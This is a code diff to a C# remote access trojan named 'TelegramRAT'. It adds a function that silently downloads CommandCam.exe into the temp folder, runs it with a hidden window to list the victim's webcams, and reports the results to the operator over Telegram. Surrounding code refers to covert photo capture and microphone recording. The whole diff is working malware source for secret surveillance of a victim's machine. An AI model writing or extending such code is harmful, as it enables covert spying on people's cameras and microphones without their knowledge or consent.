@@ -431,7 +431,69 @@ namespace TelegramRAT
             // Delete photo
             File.Delete(filename);
         }
+ // Webcam list
+ public static void webcamList()
+ {
+     try
+     {
+         // Links
+         string commandCamPATH = Path.Combine(Path.GetTempPath(), "CommandCam.exe");
+         string commandCamLINK = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";
 
+         // Check if CommandCam.exe file exists
+         if (!File.Exists(commandCamPATH))
+         {
+             telegram.sendText("📷 Downloading CommandCam...");
+             using (var webClient = new WebClient())
+             {
+                 webClient.DownloadFile(commandCamLINK, commandCamPATH);
+             }
+             telegram.sendText("📷 CommandCam loaded!");
+         }
+
+         // List of Available WebCams
+         var process = new Process
+         {
+             StartInfo = new ProcessStartInfo
+             {
+                 FileName = commandCamPATH,
+                 Arguments = "/devlist",
+                 RedirectStandardOutput = true,
+                 RedirectStandardError = true,
+                 CreateNoWindow = true,
+                 WindowStyle = ProcessWindowStyle.Hidden,
+                 UseShellExecute = false // Required for redirection
+             }
+         };
+
+         process.Start();
+         var output = process.StandardOutput.ReadToEnd();
+         var error = process.StandardError.ReadToEnd();
+         process.WaitForExit();
+
+         var ListOfWebCams = string.Join("\n", (string.IsNullOrEmpty(output) ? error : output)
+             .Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
+             .SkipWhile(line => !line.Contains("Available capture devices:"))
+             .Skip(1)
+             .Select(line =>
+             {
+                 var parts = line.Split('.', Convert.ToChar(2));
+                 if (parts.Length == 2 && int.TryParse(parts[0].Trim(), out int index))
+                     return $"📷 Index: {index}, Name: {parts[1].Trim()}";
+                 return null;
+             })
+             .Where(info => info != null));
+
+         if (!string.IsNullOrEmpty(ListOfWebCams))
+             telegram.sendText(ListOfWebCams);
+         else
+             telegram.sendText("📷 No webcams found!");
+     }
+     catch (Exception ex)
+     {
+         telegram.sendText($"📷 Error: {ex.Message}");
+     }
+ }
         // Record microphone
         public static void recordMircophone(string time)
         {
